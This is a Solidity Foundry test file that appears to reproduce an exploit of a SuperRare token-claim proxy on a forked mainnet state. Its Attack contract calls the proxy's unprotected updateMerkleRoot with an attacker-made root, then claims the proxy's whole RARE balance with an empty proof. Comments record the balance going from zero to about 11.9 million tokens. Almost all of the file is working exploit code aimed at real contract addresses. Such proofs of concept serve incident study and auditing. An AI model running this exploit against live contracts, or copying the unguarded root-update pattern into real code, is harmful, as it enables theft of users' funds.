// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
//import "src/PoC.sol";
import {Test, console} from "forge-std/Test.sol";

address constant proxy = 0x3f4D749675B3e48bCCd932033808a7079328Eb48;
address constant rare = 0xba5BDe662c17e2aDFF1075610382B9B691296350;
address constant attacker = 0x5B9B4B4DaFbCfCEEa7aFbA56958fcBB37d82D4a2;
address constant attack_contract = 0x08947cedf35f9669012bDA6FdA9d03c399B017Ab;

contract SuperRare_PoC is Test {
    function setUp() public {
        vm.createSelectFork("rpc_url", 23016422);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Attack acTemp = new Attack();
        bytes memory code = address(acTemp).code;
        vm.etch(attack_contract, code);
        Attack ac = Attack(attack_contract);

        uint256 stBalance = ac.stBalance();
        console.log("stBalance", stBalance);
        // 11907874713019104529057960
    
        uint256 tokenBalance = ac.getBalance();
        console.log("Before", tokenBalance);
        // 0
				
		bytes32 fakeRoot = keccak256(abi.encodePacked(attack_contract, stBalance));
        ac.attack(fakeRoot, stBalance);

        uint256 tokenBalanceAfter = ac.getBalance();
        console.log("After", tokenBalanceAfter);
        // 11907874713019104529057960
        vm.stopPrank();
    }
}

contract Attack {
    function stBalance() public view returns (uint256) {
        return IERC20(rare).balanceOf(proxy);
    }
    function getBalance() public view returns (uint256) {
        return IERC20(rare).balanceOf(address(this));
    }
    function attack(bytes32 newRoot, uint256 amout) public {
        IERC1967Proxy target = IERC1967Proxy(proxy);
        target.updateMerkleRoot(newRoot);
        bytes32[] memory proof = new bytes32[](0);
        target.claim(amout, proof);
    }
}

interface IERC1967Proxy {
    function updateMerkleRoot(bytes32 newRoot) external;
    function claim(uint256 amount, bytes32[] calldata proof) external;
}

interface IERC20 {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
    function withdraw(uint256 wad) external;
    function deposit(uint256 wad) external returns (bool);
    function owner() external view returns (address);
}
